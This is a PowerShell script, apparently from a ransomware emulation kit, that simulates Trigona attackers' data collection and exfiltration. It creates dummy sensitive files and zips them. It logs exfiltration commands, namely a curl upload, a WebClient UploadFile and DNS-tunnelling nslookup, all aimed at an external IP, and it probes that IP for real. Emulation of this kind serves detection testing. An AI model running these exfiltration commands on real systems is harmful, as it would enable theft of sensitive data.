# ============================================================================
# TRIGONA RANSOMWARE SIMULATION - PHASE 6: COLLECTION & EXFILTRATION
# ============================================================================
# This script simulates how the Trigona attackers collected and exfiltrated
# data prior to encryption.
# ============================================================================

function Simulate-CollectionAndExfiltration {
    param($SimPaths)
    
    Write-Host "[+] Simulating Collection & Exfiltration..." -ForegroundColor Green
    
    # Create sample sensitive data files
    $sensitiveData = @(
        @{
            Name = "FinancialData_2023.xlsx"
            Content = "Employee ID,Name,Salary,SSN`n1001,John Smith,85000,123-45-6789`n1002,Jane Doe,92000,234-56-7890`n1003,Bob Johnson,78000,345-67-8901"
        },
        @{
            Name = "CustomerDatabase.csv"
            Content = "CustomerID,Name,Email,CreditCard`n5001,Mark Wilson,mark@example.com,4111-1111-1111-1111`n5002,Sarah Brown,sarah@example.com,5500-0000-0000-0004`n5003,David Lee,david@example.com,3700-0000-0000-002"
        },
        @{
            Name = "StrategicPlan_2024.docx"
            Content = "CONFIDENTIAL: Strategic Initiative for Market Expansion`nTarget Acquisition: Company XYZ`nBudget Allocation: $25M`nTimeline: Q2 2024`nKey Stakeholders: CEO, CFO, CTO`nRisk Assessment: Medium"
        },
        @{
            Name = "Passwords.txt"
            Content = "Admin Portal: admin/P@ssw0rd123!`nFile Server: fsadmin/FileAccess2023$`nVPN Access: vpnuser/VPN@ccess2023`nDatabase: dbadmin/Sql$3rver2023"
        }
    )
    
    # Create the sensitive files
    foreach ($file in $sensitiveData) {
        $filePath = "$($SimPaths.VictimFiles)\$($file.Name)"
        Set-Content -Path $filePath -Value $file.Content -Force
    }
    
    # Create data collection commands log
    $dataCollectionCommands = @(
        "findstr /si password *.txt *.xml *.docx",
        "findstr /si SSN *.csv *.xlsx",
        "findstr /si confidential *.docx *.pptx *.xlsx",
        "PowerShell Compress-Archive -Path 'C:\TrigonaSim\victim_files\*' -DestinationPath 'C:\TrigonaSim\exfil\collected_data.zip' -Force",
        "copy 'C:\TrigonaSim\exfil\collected_data.zip' 'C:\Windows\Temp\c_d.zip'"
    )
    
    $collectionLogPath = "$($SimPaths.Logs)\data_collection.log"
    Set-Content -Path $collectionLogPath -Value $dataCollectionCommands -Force
    
    # Actually create the ZIP archive to simulate the collection
    Compress-Archive -Path "$($SimPaths.VictimFiles)\*" -DestinationPath "$($SimPaths.Exfil)\collected_data.zip" -Force
    Copy-Item "$($SimPaths.Exfil)\collected_data.zip" -Destination "$env:TEMP\c_d.zip" -Force
    
    # Create exfiltration commands log
    $exfilCommands = @(
        "curl -F 'data=@C:\Windows\Temp\c_d.zip' http://23.146.242.199/upload.php",
        "$webClient = New-Object System.Net.WebClient",
        "$webClient.UploadFile('http://23.146.242.199/upload.php', '$env:TEMP\c_d.zip')",
        "# DNS exfiltration simulation",
        "for ($i=0; $i -lt 10; $i++) {",
        "    $segment = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('chunk$i'))",
        "    nslookup $segment.exfil.23.146.242.199",
        "}"
    )
    
    $exfilLogPath = "$($SimPaths.Logs)\exfiltration.log"
    Set-Content -Path $exfilLogPath -Value $exfilCommands -Force
    
    # Simulate network traffic for exfiltration
    try {
        $null = Test-NetConnection -ComputerName "23.146.242.199" -Port 80 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "23.146.242.199" -Port 443 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "130.0.232.213" -Port 443 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        
        # Generate DNS traffic
        $null = Resolve-DnsName -Name "exfil-simulation.23.146.242.199" -Type A -ErrorAction SilentlyContinue
    } catch {}
    
    # Create fake network capture of exfiltration
    $fakeNetworkCapture = New-Object byte[] 8192
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($fakeNetworkCapture)
    [System.IO.File]::WriteAllBytes("$($SimPaths.Logs)\exfil_capture.pcap", $fakeNetworkCapture)
    
    # Log the collection and exfiltration
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1347 -Message "SIMULATION: Data collection activity detected - files being archived" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1348 -Message "SIMULATION: Data exfiltration attempt detected - network traffic to suspicious domain" -EntryType Warning
    
    Write-Host "  [✓] Collection & Exfiltration artifacts created" -ForegroundColor Yellow
}